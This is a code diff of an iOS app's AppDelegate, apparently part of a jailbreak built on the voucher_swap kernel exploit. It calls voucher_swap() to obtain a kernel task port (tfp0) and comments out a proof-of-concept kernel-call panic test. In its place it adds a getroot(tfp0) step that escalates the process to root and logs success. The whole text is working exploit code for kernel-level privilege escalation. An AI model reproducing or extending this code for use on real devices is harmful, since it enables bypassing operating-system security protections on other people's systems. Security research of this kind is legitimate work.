@@ -7,10 +7,12 @@
 //
 
 #import "AppDelegate.h"
-
+#include "postsploit.h"
+#include <unistd.h>
 #import "voucher_swap.h"
 #import "kernel_call.h"
 #import "log.h"
+#import "offsets.h"
 
 @interface AppDelegate ()
 
@@ -20,29 +22,36 @@
 
 
 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
-    printf("Sleeping for 30 second to avoid un-auth operation.");
     sleep(30);
+    offsets_init();
 	mach_port_t tfp0 = voucher_swap();
     if (!MACH_PORT_VALID(tfp0)) {
         printf("failed to get tfp0!\n");
         exit(1);
     }
     printf("we got tfp0 at: 0x%x\n",tfp0);
-	bool ok = kernel_call_init();
-	if (!ok) {
-		exit(1);
-	}
-	INFO("about to panic: check the panic log to observe PC+register control");
+//	bool ok = kernel_call_init();
+	//if (!ok) {
+	//	exit(1);
+	//}
+	//INFO("about to panic: check the panic log to observe PC+register control");
 	sleep(1);
-	kernel_call_7(0xfffffff041414141, 7,
-			0x4040404040404040,
-			0x4141414141414141,
-			0x4242424242424242,
-			0x4343434343434343,
-			0x4444444444444444,
-			0x4545454545454545,
-			0x4646464646464646);
-	kernel_call_deinit();
+    if (getroot(tfp0) != 0) {
+        printf("failed to get root our UID is: %i /n", getuid());
+        exit(1);
+    }
+    INFO("WE ARE RUNNING AS ROOT! UID: %i", getuid());
+    
+    
+	//kernel_call_7(0xfffffff041414141, 7,
+			//0x4040404040404040,
+			//0x4141414141414141,
+			//0x4242424242424242,
+			//0x4343434343434343,
+			//0x4444444444444444,
+			//0x4545454545454545,
+		//	0x4646464646464646);
+	//kernel_call_deinit();
 	return YES;
 }
 
